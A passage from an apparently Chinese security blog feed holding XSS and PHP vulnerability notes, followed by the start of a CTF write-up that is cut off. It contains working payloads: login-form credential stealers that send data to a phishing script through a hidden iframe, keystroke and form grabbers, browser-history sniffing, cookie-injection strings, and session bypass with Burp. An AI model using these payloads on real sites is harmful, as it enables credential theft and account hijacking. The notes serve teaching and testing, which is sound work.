class="property">user</span>.<span class="property">value</span> + <span class="string">&quot;&amp;pass=&quot;</span> + <span class="title class_">Form</span>.<span class="property">pass</span>.<span class="property">value</span>; <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line">&#125; </span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure><p>这段代码用来截取用户在登录页面输入的用户名和密码信息，然后提交给当前创建的 PHP<br>脚本.</p><h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> loginForm = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&#x27; userslogin &#x27;</span>]; </span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">parseData</span>(<span class="params"></span>)  &#123;  </span><br><span class="line"><span class="keyword">var</span> user = loginForm.<span class="property">user</span>.<span class="property">value</span>; </span><br><span class="line"> <span class="keyword">var</span> pass = loginForm.<span class="property">pass</span>.<span class="property">value</span>; </span><br><span class="line"> <span class="title function_">saveData</span>(username,password); </span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line"> &#125;  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saveData</span>(<span class="params">username,password</span>)  &#123;  </span><br><span class="line"><span class="keyword">var</span> frame=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>); </span><br><span class="line">frame.<span class="property">src</span>=<span class="string">&quot; http://127.0.0.1/phishing.php?user=&quot;</span> + user + <span class="string">&quot;&amp;pass=&quot;</span> + pass;  frame.<span class="property">style</span>.<span class="property">display</span>=<span class="string">&#x27;none&#x27;</span>;  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(frame); </span><br><span class="line"> &#125;  </span><br><span class="line">loginForm.<span class="property">onsubmit</span> = parseData; </span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure><p>这段代码也会获取和记录用户所提交的信息，同实例一。</p><h3 id="劫持链接的onclick"><a href="#劫持链接的onclick" class="headerlink" title="劫持链接的onclick"></a>劫持链接的onclick</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="variable language_">document</span>.<span class="property">links</span>.<span class="property">length</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">links</span>[i].<span class="property">onclick</span> = hijack; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="监听键盘的onkeydown"><a href="#监听键盘的onkeydown" class="headerlink" title="监听键盘的onkeydown"></a>监听键盘的onkeydown</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span>=<span class="keyword">function</span>(<span class="params">e</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!e)e=<span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="title function_">hijack</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(ex)</span><br><span class="line">&#123; &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="劫持表单的输入框"><a href="#劫持表单的输入框" class="headerlink" title="劫持表单的输入框"></a>劫持表单的输入框</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">onkeyup</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123; </span><br><span class="line"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&#x27;PassFormlogin&#x27;</span>].<span class="property">onsubmit</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">&#123;    pwd = <span class="variable language_">this</span>.<span class="property">PassInputUsername0</span>.<span class="property">value</span> + <span class="string">&#x27;|&#x27;</span> + <span class="variable language_">this</span>.<span class="property">PassInputPassword0</span>.<span class="property">value</span>;    </span><br><span class="line">     <span class="title function_">log</span>(<span class="built_in">escape</span>(pwd)); </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JS遍历-Form-表单元素"><a href="#JS遍历-Form-表单元素" class="headerlink" title="JS遍历 Form 表单元素"></a>JS遍历 Form 表单元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">grabber</span>(<span class="params"></span>)</span><br><span class="line">&#123; </span><br><span class="line">  F = <span class="variable language_">document</span>.<span class="property">forms</span>;  </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j&lt;F.<span class="property">length</span>; ++j)  </span><br><span class="line">  &#123;   </span><br><span class="line">      f = F[j];   <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;f.<span class="property">length</span>; ++i) </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">if</span> (f[i].<span class="property">type</span>.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;password&quot;</span>)    </span><br><span class="line">      &#123;    </span><br><span class="line">         <span class="title function_">alert</span>(<span class="string">&quot;Password:&quot;</span>+f[i].<span class="property">value</span>)    </span><br><span class="line">      &#125;    <span class="keyword">else</span> <span class="keyword">if</span> (f[i].<span class="property">type</span>.<span class="title function_">toLowerCase</span>() != <span class="string">&quot;submit&quot;</span>)   </span><br><span class="line">           &#123;     </span><br><span class="line">              <span class="title function_">alert</span>(<span class="string">&quot;Text:&quot;</span>+f[i].<span class="property">value</span>)    </span><br><span class="line">           &#125;  </span><br><span class="line">     &#125;  </span><br><span class="line">  &#125; </span><br><span class="line">&#125;  <span class="title function_">grabber</span>();</span><br></pre></td></tr></table></figure><h3 id="JS捕获用户特定按键"><a href="#JS捕获用户特定按键" class="headerlink" title="JS捕获用户特定按键"></a>JS捕获用户特定按键</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">keyDown</span>(<span class="params"></span>) &#123;               </span><br><span class="line"><span class="keyword">var</span> keycode = event.<span class="property">keyCode</span>;               </span><br><span class="line"><span class="keyword">var</span> realkey = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(event.<span class="property">keyCode</span>);                </span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;按键码: &quot;</span> + keycode + <span class="string">&quot; 字符: &quot;</span> + realkey);           </span><br><span class="line">&#125;           </span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = keyDown;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS-History-Hack"><a href="#XSS-History-Hack" class="headerlink" title="XSS History Hack"></a>XSS History Hack</h2><h3 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h3><blockquote><p>对于网站上超级链接，我们点击后会发现颜色出现变化，那些没发生颜色变化的正是我们没有访问过的。<br>一般来说，用户每天都会浏览许多网页，这些网页 都会被浏览器记录下来，除非用户刻意清除，否则历史 记录将一直保存在本地计算机中。倘若攻击者能获取用 户浏览器的历史记录或搜索信息，将是一件十分危险的 事，攻击者可以在此基础上进一步发起其他攻击，如社 会工程学。</p></blockquote><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>能获取浏览器的某些历史记录，其原理就是利用 CSS 能定义访问 过的和未访问过的超级链接的样式。由于 JavaScript 可以读取任何元素的 CSS 信息，自然能分辨 浏览器应用了哪种样式和用户是否访问过该链接。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">H3</span>&gt;</span>Visited<span class="tag">&lt;/<span class="name">H3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;visited&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">H3</span>&gt;</span>Not Visited<span class="tag">&lt;/<span class="name">H3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;notvisited&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="keyword">var</span> websites = [ <span class="string">&quot;http://www.baidu.com/&quot;</span>, <span class="string">&quot;http://wwww.google.com/&quot;</span>, <span class="string">&quot;http://www.sina.com.cn/&quot;</span>, <span class="string">&quot;http://www.qq.com/&quot;</span>, <span class="string">&quot;http://www.163.com/&quot;</span>, <span class="string">&quot;http://www.sohu.com/&quot;</span>, <span class="string">&quot;http://www.playsec.com/&quot;</span>, <span class="string">&quot;http://hi.baidu.com/&quot;</span>, <span class="string">&quot;http://zhidao.baidu.com/&quot;</span>, </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="string">&quot;http://www.taobao.com/&quot;</span>, <span class="string">&quot;http://weibo.com/&quot;</span>, ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; websites.<span class="property">length</span>; i++) &#123;  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">link.<span class="property">id</span> = <span class="string">&quot;id&quot;</span> + i;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">link.<span class="property">href</span> = websites[i];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">link.<span class="property">innerHTML</span> = websites[i];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;style&gt;&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;#id&#x27;</span> + i + <span class="string">&quot;:visited &#123;color: #FF0000;&#125;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;/style&gt;&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(link);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> color = <span class="variable language_">document</span>.<span class="property">defaultView</span>.<span class="title function_">getComputedStyle</span>(link,<span class="literal">null</span>).<span class="property">getPropertyValue</span> (<span class="string">&quot;color&quot;</span>);  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(link);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">if</span> (color == <span class="string">&quot;rgb(255, 0, 0)&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> item = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">item.<span class="title function_">appendChild</span>(link);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;visited&#x27;</span>).<span class="title function_">appendChild</span>(item);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125; <span class="keyword">else</span> &#123;         </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> item = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">item.<span class="title function_">appendChild</span>(link);    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;notvisited&#x27;</span>).<span class="title function_">appendChild</span>(item);   </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span> </span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><blockquote><p>将上述代码保存到一个文档中，使用火狐打开之后，我们可以看到Visited和Not Visited 两部分，分别罗列出来我们曾经访问过的网站和没有访问过的网站。<br>出现这种效果的原因在于，我们上述的代码已经预先的把用户可能访问的网站记录下来，然后通过JS遍历列表，并利用getComputedStyle()的方法检查相应超级链接的style属性，从而辨别出浏览器是否访问过该网站。</p></blockquote><h2 id="SERVER-PHP-SELF"><a href="#SERVER-PHP-SELF" class="headerlink" title="$_SERVER[PHP_SELF]"></a>$_SERVER[PHP_SELF]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;]; ?&gt;&quot;&gt;              </span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;submitted&quot; value=&quot;1&quot; /&gt;                         </span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit!&quot; /&gt;  &lt;/form&gt;</span><br></pre></td></tr></table></figure><p>将其保存，在php下运行。</p><h3 id="产生-XSS-漏洞的原因"><a href="#产生-XSS-漏洞的原因" class="headerlink" title="产生 XSS 漏洞的原因"></a>产生 XSS 漏洞的原因</h3><blockquote><p>php echo $_SERVER[‘PHP_SELF’];<br>这行代码直接输出 PHP_SELF 变量，而该变量由用户控制。</p></blockquote><h3 id="如何规避"><a href="#如何规避" class="headerlink" title="如何规避"></a>如何规避</h3><blockquote><p>可以使用<code>htmlentities($_SERVER[‘PHP_SELF’])</code>来替代<code>$_SERVER[‘PHP_SELF’]</code>， 这样即使网址中包含恶意代码，也会被转换为用于显示的 HTML代码，而不是被直接嵌入 HTML 代码中执行。</p></blockquote><p><strong>注意：除了 PHP_SELF 之外，其他的<code>$_SERVER</code> 变量也可能存在类似漏洞，比 如 SCRIPT_URI、QUERY_STRING、PATH_INFO 等，在使用之前一定要先进行 htmlentities 之类 的转换。</strong></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>（1）register_globals&#x3D;on。<br>（2）extract()。<br>（3）遍历初始化变量。</p><h3 id="一-2"><a href="#一-2" class="headerlink" title="一"></a>一</h3><h3 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h3><p>register_globals是php.ini里的一个配置，这个配置影响到PHP如何接受传递过来的参数，当register_globals打开以后，各种变量都可以被重新注册，包括来自HTML的表单请求变量，再加上PHP在使用变量之前不需要进行初始化，这便容易写出不安全的代码，然而我们只需要开启它便可以达到我们的攻击目的。</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><blockquote><p>开启r_g只需要修改PHP的配置文件php.in，在该文件中找到r_g的属性，然后把register——globals&#x3D;Off改为register_globals&#x3D;on即可。</p></blockquote><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码的输出很简单，但是<code>$a</code>事先没有初始化，访问<code>localhost/test.php?a=XSS</code>便能实现攻击。</p><h3 id="二-2"><a href="#二-2" class="headerlink" title="二"></a>二</h3><h3 id="背景-3"><a href="#背景-3" class="headerlink" title="背景"></a>背景</h3><blockquote><p>extract()函数，它用来将变量从数组导入到当前的符号表中</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$a</code>已经被初始化，如果直接访问该页面，输出的值为1.添加参数a后，<code>localhost/test.php?a=XSS</code>,页面输出的XSS，<code>$a</code>被重新赋值，因为使用了<code>extract($_GET);</code><br>这行代码是使用extract()覆盖所有以GET方法获取的变量，即<code>localhost/test.php?a=&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>能产生一个XSS。</p><h3 id="三-2"><a href="#三-2" class="headerlink" title="三"></a>三</h3><h3 id="背景-4"><a href="#背景-4" class="headerlink" title="背景"></a>背景</h3><blockquote><p>使用foreach()函数模拟全局操作</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$chs</span>=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span> &amp;&amp; <span class="variable">$charset</span> != <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$chs</span>=<span class="keyword">new</span> <span class="title class_">Chinese</span>(<span class="string">&#x27;UTF-8&#x27;</span>,<span class="variable">$charset</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$chs</span>-&gt;<span class="title function_ invoke__">Convert</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$chs</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>简化之后如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt;<span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="variable">$$key</span> =$ value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:<br><code>localhost/test.php?a=XSS&amp;b=&lt;h1&gt;XSS&lt;/h1&gt;</code></p><h2 id="字符集编码隐患"><a href="#字符集编码隐患" class="headerlink" title="字符集编码隐患"></a>字符集编码隐患</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/test.php?a=xss%d5&#x27;;alert(0)//</span><br></pre></td></tr></table></figure><p><code>$a</code>为动态内容，如果直接把xss’;alert(0)&#x2F;&#x2F;赋给<code>$a</code><br><code>localhost/test.php?a=xss&#39;;alert(0)//</code><br>则会返回：<br><code>&lt;script&gt;x=&#39;xss\&#39;;alert(0)//&#39;;y=&#39;[user_input]&#39;;&lt;/script&gt;</code></p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="背景-5"><a href="#背景-5" class="headerlink" title="背景"></a>背景</h3><blockquote><p>用户在浏览网站时，该网站可能会向电脑写入一个很小的文件，这个文件记录了用户的ID，Password,Time等等，这个文件就是Cookie文件，当我们再次访问该网站时，浏览器会自动检测存储，，将本地的Cookie发送给网站，网站通过读取Cookie来获取用户的信息，做出相应的动作，例如我们经常看到的，直接登陆，除了在浏览器内存中保存的Cookie之外，大部分的Cookie会保存在本地的硬盘。</p></blockquote><h3 id="XSS基本测试"><a href="#XSS基本测试" class="headerlink" title="XSS基本测试"></a>XSS基本测试</h3><p>(1)查找HTML显示的标签，查看是否在显示区域<br>(2)如果不在，则<br><code>&lt;script&gt;alert((document.cookie)&lt;/script&gt;:普通注入</code><br><code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;:闭合标签注入</code><br><code>&lt;/textarea&gt;&#39;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;:闭合标签注入</code><br>读写cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public class CookieTest extends HttpServlet</span><br><span class="line">&#123;</span><br><span class="line">  public void doGet(HttpServletRequest request,HttpServletResponse reponse) throws ServletException,IOException</span><br><span class="line">  &#123;</span><br><span class="line">   this.doPost(request,reponse);</span><br><span class="line">  &#125;</span><br><span class="line">  public void doPost(HttpServletRequest request,HttpServletReponse reponse) throws ServletExeption,IOException</span><br><span class="line">  &#123;</span><br><span class="line">   PrintWriter out =response.getWriter();</span><br><span class="line">   Cookie c[]=request.getCookies();</span><br><span class="line">   if(c!=null)</span><br><span class="line">   &#123;</span><br><span class="line">    for (int i=0;i&lt;c.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">     Cookie cookie=c[i];</span><br><span class="line">     out.print(&quot;Welcome&quot;+cookie.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;else</span><br><span class="line">   &#123;</span><br><span class="line">    String username=request.getParameter(&quot;username&quot;);</span><br><span class="line">    if(username!=null&amp;&amp;!&quot;&quot;.equals(username))</span><br><span class="line">    &#123;</span><br><span class="line">     Coolie ck=new Cookie(&quot;Name&quot;,username);</span><br><span class="line">     reponse.addCookie(ck);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h3><p>进行抓包，我们会发现Cookie后会带有几行密文，这就是WEB服务器向客户端发送的Cookie，当攻击者拿到这段Cookie，就可以使用当前用户的身份登陆。<br>使用Burp,add Request header，在Match输入框内输入要替换的请求头，这里为正则表达，找到该框<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e1110123fcee95b8.png" alt="图片.png">进行add添加MAtch进行匹配,MATCH:^Cookie*$,REPLACE:为自己要设置的Cookie，设置完，再次请求，发现Cookie已经变成我们刚才设置的，绕过了登陆。</p><h2 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-84ecc77c876f5e98.png" alt="图片.png"><br>对于安全性来说SESSION的安全性比Cookie高，对于构造，我们只需在HTML代码中添加<br><code>&lt;script type=&#39;text/javascript&#39;&gt; document.cookie=&#39;PHPSESSID=123456789&#39; &lt;/script&gt;</code>类似于这样即可，重新发送，我们会发现我们 所构造的SESSION合法。</p><h3 id="如何拿到session"><a href="#如何拿到session" class="headerlink" title="如何拿到session"></a>如何拿到session</h3><p>session是可以储存在Cookie中，相当于临时cookie，它既可以通过抓包的方式展现，也可以通过构造payload<code>.../user.action;jsessionid=...</code>，SESSION是与浏览器之间的一次会话，它用来区分不同的用户，当浏览器关闭后，会随之消失，故我们需要在浏览器与服务器会话结束之前拿到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WPSEC 2019 Web</title>
      <link href="/2019/03/04/WPSEC-2019-Web/"/>
      <url>/2019/03/04/WPSEC-2019-Web/</url>
      
        <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-414f3ed62541fe04.png" alt="img"></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-739cb4f7a3b3353d.png" alt="img"></p><h4 id="同时GET，POST"><a href="#同时GET，POST" class="headerlink" title="同时GET，POST"></a>同时GET，POST</h4><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><h4 id="【代码审计】之变量覆盖一"><a href="#【代码审计】之变量覆盖一" class="headerlink" title="【代码审计】之变量覆盖一"></a>【代码审计】之变量覆盖一</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag In the variable ! </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&#x27;args&#x27;]))&#123;</span><br><span class="line">    $args = $_GET[&#x27;args&#x27;];</span><br><span class="line">    